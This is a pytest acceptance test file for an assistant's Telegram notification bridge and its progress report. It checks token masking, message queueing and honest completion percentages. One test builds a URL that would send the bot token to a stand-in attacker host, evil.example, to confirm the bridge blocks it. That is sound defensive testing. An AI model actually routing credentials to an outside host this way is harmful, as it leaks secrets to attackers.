"""Acceptance tests: stage 9 - the phone bridge, and an honest progress number.

The owner's words: "whatever it is - an update, a problem - I want it on Telegram,
just a message to me", plus "tell me 100% or not, honestly".

Two things are being protected here, and they are the two that hurt if they slip:

* **The token is a password.** It may live in the vault, be sent to api.telegram.org
  and appear nowhere else - not in a result dict, not in an error message, not in
  a log line, and never to another host.
* **The number must not flatter.** `done` may only be claimed for a row whose code
  is actually importable, and the arithmetic must not round 74% up to "100%".

Run:  python -m pytest tests/test_telegram_and_progress_acceptance.py -q
"""
from __future__ import annotations

import inspect
import json
import urllib.error

import pytest

from brain.agent import progress
from brain.agent import telegram as tg


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #
class Vault:
    """The sealed meta store, in memory."""

    def __init__(self):
        self.meta = {}

    def meta_get(self, key, default=None):
        return self.meta.get(key, default)

    def meta_set(self, key, value):
        self.meta[key] = value


TOKEN = "123456789:AAFakeTokenForTestsOnly-abcDEFghiJKL"


@pytest.fixture()
def wire():
    """Records every request and answers like Telegram does."""
    calls = []

    def opener(request, timeout):
        calls.append({"url": request.full_url,
                      "body": (request.data or b"").decode()})
        if "getUpdates" in request.full_url:
            return json.dumps({"ok": True, "result": [{
                "message": {"chat": {"id": 424242, "first_name": "Owner",
                                     "type": "private"}, "text": "/start"}}]})
        if "getMe" in request.full_url:
            return json.dumps({"ok": True, "result": {"username": "nila_bot",
                                                      "first_name": "Nila",
                                                      "id": 123456789}})
        return json.dumps({"ok": True, "result": {"message_id": 1}})

    return calls, opener


def bridge(vault, opener):
    return tg.Telegram(vault=vault, opener=opener)


def ready(vault, opener):
    bot = bridge(vault, opener)
    bot.set_token(TOKEN)
    bot.set_chat("424242")
    return bot


# --------------------------------------------------------------------------- #
# 1. the token is treated like the passphrase
# --------------------------------------------------------------------------- #
def test_a_fresh_bridge_is_not_configured_and_says_how():
    status = tg.Telegram(vault=Vault()).status()
    assert status["configured"] is False
    assert "BotFather" in status["how"]
    assert status["token"] == "not set"


def test_the_token_is_masked_everywhere_it_is_shown(wire):
    calls, opener = wire
    vault = Vault()
    bot = bridge(vault, opener)
    shown = bot.set_token(TOKEN)
    assert TOKEN not in json.dumps(shown)
    assert shown["token"].endswith(f"({len(TOKEN)} chars)")
    assert shown["token"].startswith("12345")
    assert TOKEN not in json.dumps(bot.status())
    assert TOKEN not in json.dumps(ready(vault, opener).me())
    # …and it does live in the vault, not in a config file.
    assert vault.meta[tg.META_TOKEN] == TOKEN


def test_the_token_can_never_be_sent_to_another_host():
    bot = tg.Telegram(vault=Vault(), opener=lambda r, t: "{}")
    bot.set_token(TOKEN)
    bot.chat_id = "1"
    bot._url = lambda method: f"https://evil.example/bot{bot.token}/{method}"
    with pytest.raises(tg.TelegramError) as exc:
        bot._post("sendMessage", {"chat_id": "1", "text": "hi"})
    assert "api.telegram.org" in str(exc.value)


def test_a_telegram_error_is_not_echoed_with_the_token(wire):
    vault = Vault()
    bot = bridge(vault, lambda r, t: (_ for _ in ()).throw(
        urllib.error.HTTPError("x", 400, "Bad Request", {}, None)))
    bot.set_token(TOKEN)
    bot.chat_id = "1"
    with pytest.raises(tg.TelegramError) as exc:
        bot._post("sendMessage", {"chat_id": "1", "text": "hi"})
    assert TOKEN not in str(exc.value)
    assert "HTTP 400" in str(exc.value)


def test_a_malformed_token_is_refused_before_it_is_stored():
    bot = tg.Telegram(vault=Vault(), opener=lambda r, t: "{}")
    for bad in ("", "hello", "abc:def"):
        with pytest.raises(tg.TelegramError):
            bot.set_token(bad)
    assert bot.status()["configured"] is False


def test_a_chat_id_must_be_a_number():
    bot = tg.Telegram(vault=Vault(), opener=lambda r, t: "{}")
    bot.set_token(TOKEN)
    with pytest.raises(tg.TelegramError) as exc:
        bot.set_chat("my phone")
    assert "is not a chat id" in str(exc.value)


# --------------------------------------------------------------------------- #
# 2. one chat, one direction
# --------------------------------------------------------------------------- #
def test_it_sends_to_the_one_chosen_chat(wire):
    calls, opener = wire
    vault = Vault()
    bot = ready(vault, opener)
    out = bot.send("Nila: the electricity bill is due today")
    assert out["ok"] is True and out["sent"] == 1
    assert "chat_id=424242" in calls[-1]["body"]
    assert calls[-1]["url"].startswith("https://api.telegram.org/bot")


def test_a_bot_cannot_message_first_so_whoami_reads_the_start(wire):
    calls, opener = wire
    bot = bridge(Vault(), opener)
    bot.set_token(TOKEN)
    out = bot.whoami()
    assert out["chats"][0]["chat_id"] == "424242"
    assert "brain telegram chat 424242" in out["hint"]


def test_nothing_is_sent_before_a_chat_is_chosen(wire):
    calls, opener = wire
    bot = bridge(Vault(), opener)
    bot.set_token(TOKEN)
    with pytest.raises(tg.TelegramError) as exc:
        bot.send("hello")
    assert "no chat chosen" in str(exc.value)
    assert not [c for c in calls if "sendMessage" in c["url"]]


def test_two_way_is_declared_missing_not_implied():
    status = tg.Telegram(vault=Vault()).status()
    assert status["one_way"] is True
    assert "does not read replies" in status["note"]
    source = inspect.getsource(tg)
    assert "getUpdates" in source            # only to find the chat id,
    assert "polling" not in source.lower()   # never to hold a conversation


# --------------------------------------------------------------------------- #
# 3. what may be pushed, and the one call everything uses
# --------------------------------------------------------------------------- #
def test_notify_does_nothing_until_it_is_set_up():
    out = tg.Telegram(vault=Vault(), opener=lambda r, t: "{}").notify("hi")
    assert out["ok"] is False and "not set up" in out["skipped"]


def test_each_kind_can_be_turned_off_without_losing_the_others(wire):
    calls, opener = wire
    bot = ready(Vault(), opener)
    bot.set_notify("updates", False)
    assert bot.notify("started", kind="updates")["skipped"]
    assert bot.notify("a reminder", kind="reminders")["ok"] is True


def test_notify_never_raises_into_the_action_it_reports(wire):
    def broken(request, timeout):
        raise RuntimeError("the network stack fell over")

    bot = ready(Vault(), broken)
    out = bot.notify("anything", kind="errors")
    assert out["ok"] is False and "fell over" in out["error"]


def test_a_long_report_is_split_and_arrives_in_order(wire):
    calls, opener = wire
    bot = ready(Vault(), opener)
    text = "\n".join(f"line {i}" for i in range(1200))
    out = bot.send(text)
    assert out["parts"] > 1
    bodies = [c["body"] for c in calls if "sendMessage" in c["url"]]
    assert len(bodies) == out["parts"]
    assert "line%200" in bodies[0] or "line+0" in bodies[0]


def test_splitting_never_loses_characters():
    text = "x" * 9000
    parts = tg.split_text(text)
    assert sum(len(p) for p in parts) == 9000
    assert all(len(p) <= tg.MAX_CHARS for p in parts)


# --------------------------------------------------------------------------- #
# 4. the phone being off is not a lost message
# --------------------------------------------------------------------------- #
def off(request, timeout):
    raise urllib.error.URLError("no route to host")


def test_an_unsendable_message_is_queued_in_the_vault():
    vault = Vault()
    bot = tg.Telegram(vault=vault, opener=off)
    bot.set_token(TOKEN)
    bot.set_chat("424242")
    out = bot.send("Nila: something happened")
    assert out["ok"] is False and out["queued"] == 1
    assert "queued in the vault" in out["note"]
    assert json.loads(vault.meta[tg.META_QUEUE])[0]["text"] == "Nila: something happened"


def test_the_queue_goes_out_when_the_connection_comes_back(wire):
    calls, opener = wire
    vault = Vault()
    dead = tg.Telegram(vault=vault, opener=off)
    dead.set_token(TOKEN)
    dead.set_chat("424242")
    dead.send("first")
    dead.send("second")
    assert len(dead.pending()) == 2

    alive = tg.Telegram(vault=vault, opener=opener)
    out = alive.flush()
    assert out["sent"] == 2 and out["left"] == 0
    assert [r for r in alive.pending()] == []


def test_a_successful_send_drains_the_queue_too(wire):
    calls, opener = wire
    vault = Vault()
    dead = tg.Telegram(vault=vault, opener=off)
    dead.set_token(TOKEN)
    dead.set_chat("424242")
    dead.send("while the phone was off")
    alive = tg.Telegram(vault=vault, opener=opener)
    out = alive.send("back online")
    assert out["drained"] == 1


def test_the_queue_is_capped_so_it_cannot_grow_forever():
    vault = Vault()
    bot = tg.Telegram(vault=vault, opener=off)
    bot.set_token(TOKEN)
    bot.set_chat("424242")
    for i in range(tg.MAX_QUEUED + 12):
        bot.enqueue(f"message {i}")
    rows = bot.pending()
    assert len(rows) == tg.MAX_QUEUED
    assert rows[-1]["text"] == f"message {tg.MAX_QUEUED + 11}"     # newest kept


def test_the_owner_can_read_and_drop_the_queue():
    vault = Vault()
    bot = tg.Telegram(vault=vault, opener=off)
    bot.set_token(TOKEN)
    bot.set_chat("424242")
    bot.enqueue("one")
    assert len(bot.pending()) == 1
    assert bot.drop_queue()["queued"] == 0
    assert bot.pending() == []


# --------------------------------------------------------------------------- #
# 5. the reminder path actually uses it
# --------------------------------------------------------------------------- #
def test_a_missed_reminder_is_pushed_to_the_phone(monkeypatch, tmp_path):
    from brain.cli import main as cli

    pushed = []

    class Brain:
        def due_reminders(self, consume=False):
            return [{"id": "rem_1", "title": "take the tablet", "late_minutes": 25}]

    class Bridge:
        def __init__(self, vault=None, **kw):
            self.vault = vault

        def notify(self, text, kind="", urgent=False):
            pushed.append((text, kind, urgent))
            return {"ok": True}

    monkeypatch.setattr("brain.agent.telegram.Telegram", Bridge)
    rows = cli._due_alerts(Brain(), spoken=False, vault=object())
    assert rows and rows[0]["title"] == "take the tablet"
    assert pushed and "25 min late" in pushed[0][0]
    assert pushed[0][1] == "reminders" and pushed[0][2] is True


def test_a_dead_phone_bridge_does_not_stop_the_reminder(monkeypatch, capsys):
    from brain.cli import main as cli

    class Brain:
        def due_reminders(self, consume=False):
            return [{"id": "rem_2", "title": "call amma", "late_minutes": 0}]

    class Boom:
        def __init__(self, *a, **k):
            raise RuntimeError("telegram module not loadable")

    monkeypatch.setattr("brain.agent.telegram.Telegram", Boom)
    rows = cli._due_alerts(Brain(), spoken=False, vault=object())
    assert rows and rows[0]["title"] == "call amma"
    assert "call amma" in capsys.readouterr().out


# --------------------------------------------------------------------------- #
# 6. the progress number does not flatter
# --------------------------------------------------------------------------- #
def test_every_row_is_in_exactly_one_of_three_states():
    report = progress.report()
    states = {row["state"] for row in report["features"]}
    assert states <= {"done", "partial", "missing"}
    assert report["done"] + report["partial"] + report["missing"] == report["total"]


def test_a_row_whose_code_is_missing_cannot_be_done():
    """The table may not claim a feature the installation does not have."""
    broken = [{"group": "x", "label": "imaginary", "state": "done",
               "check": "brain.nothing_here:Missing"}]
    import brain.agent.progress as mod

    original = mod.FEATURES
    mod.FEATURES = broken
    try:
        report = mod.report()
    finally:
        mod.FEATURES = original
    assert report["features"][0]["state"] == "missing"
    assert "code not found" in report["features"][0]["note"]


def test_the_percentage_is_not_rounded_up_to_a_hundred():
    report = progress.report()
    real = round(100.0 * report["done"] / report["total"])
    assert report["percent"] == real
    if report["done"] < report["total"]:
        assert report["percent"] < 100


def test_every_partial_row_says_what_it_is_waiting_for():
    report = progress.report()
    for row in report["features"]:
        if row["state"] == "partial":
            assert row.get("note"), f"{row['label']} is partial with no reason"
    assert report["limits"], "no external needs were listed"


def test_the_number_comes_from_code_not_from_a_text_file():
    source = inspect.getsource(progress)
    assert "_exists(" in source               # the real check
    assert "1.0" not in source.split("VERSION")[0]


def test_the_report_has_a_single_sensible_next_step():
    report = progress.report()
    assert isinstance(report["next"], str) and len(report["next"]) > 10
    lowered = report["next"].lower()
    assert any(word in lowered for word in
               ("transcriber", "whisper", "telegram", "v3", "re-test"))


def test_the_progress_command_shows_each_state_without_lying():
    from brain.cli import main as cli

    body = inspect.getsource(cli.cmd_progress)
    assert '"done": "[x]"' in body or "'done': '[x]'" in body
    assert "partial" in body and "missing" in body


# --------------------------------------------------------------------------- #
# 7. the dashboard shows the same truth, and cannot leak the token
# --------------------------------------------------------------------------- #
def test_the_api_reports_the_bridge_without_the_token():
    """The route must be read-only and must not contain the token."""
    import inspect

    from brain.api import gateway as gw

    body = inspect.getsource(gw.Gateway.route)
    route = body[body.index('"/v1/telegram"'):body.index('"/v1/progress"')]
    assert "status()" in route                 # the masking lives at the source
    assert "TOKEN" not in route and "token" not in route.lower().replace("token ", "")
    assert "send(" in inspect.getsource(gw.Gateway.route).split('"/v1/telegram/test"')[1][:400]


def test_the_dashboard_asks_for_the_bridge_and_the_progress():
    base = __import__("pathlib").Path(__file__).resolve().parents[1] / "brain" / "api" / "static"
    js = (base / "dashboard.js").read_text()
    html = (base / "dashboard.html").read_text()
    assert "/v1/telegram" in js and "/v1/progress" in js
    assert 'id="phone"' in html and 'id="v2"' in html


# --------------------------------------------------------------------------- #
# 8. a new install works on the first command, not the second
# --------------------------------------------------------------------------- #
def test_init_links_the_authenticator_itself():
    """`setup.bat` -> `start-nila.bat` used to refuse: the vault was created
    with no second factor, and the first command was therefore rejected."""
    import inspect

    from brain.cli import main as cli

    body = inspect.getsource(cli.cmd_init)
    assert "enroll_totp" in body            # one implementation, shared with `brain totp`
    argv = cli.build_parser().parse_args(["init", "--no-totp", "--no-voice"])
    assert argv.no_totp and argv.no_voice   # and it can still be skipped deliberately
    assert argv.no_recovery is False         # recovery codes are never skipped by default


def test_setup_bat_no_longer_asks_for_a_second_enrolment():
    from pathlib import Path

    bat = (Path(__file__).resolve().parents[1] / "setup.bat").read_text()
    assert "python brain.py init" in bat
    assert bat.count("python brain.py totp") == 1        # mentioned, not run
    assert "python brain.py totp\r\n  if errorlevel" not in bat


def test_nila_announces_herself_on_the_phone_when_she_starts():
    import inspect

    from brain.cli import main as cli

    body = inspect.getsource(cli.cmd_start)
    assert "Nila started on your PC" in body
    assert 'kind="updates"' in body


# --------------------------------------------------------------------------- #
# 9. a bot token in a log or an error is scrubbed like any other key
# --------------------------------------------------------------------------- #
def test_a_telegram_token_is_scrubbed_from_reports():
    from brain.issues_report import scrub

    token = "123456789:AAFakeRetestTokenOnly-abcDEFghiJKL"
    assert token not in scrub(token)
    assert token not in scrub(f"POST https://api.telegram.org/bot{token}/sendMessage")
    assert scrub(f"bot token: {token}") == "bot token=<REDACTED>"


def test_a_plain_chat_id_is_not_mistaken_for_a_secret():
    from brain.issues_report import scrub

    # a chat id must survive: it is not a credential, and the owner needs to read it
    assert scrub("chat 424242 chose") == "chat 424242 chose"
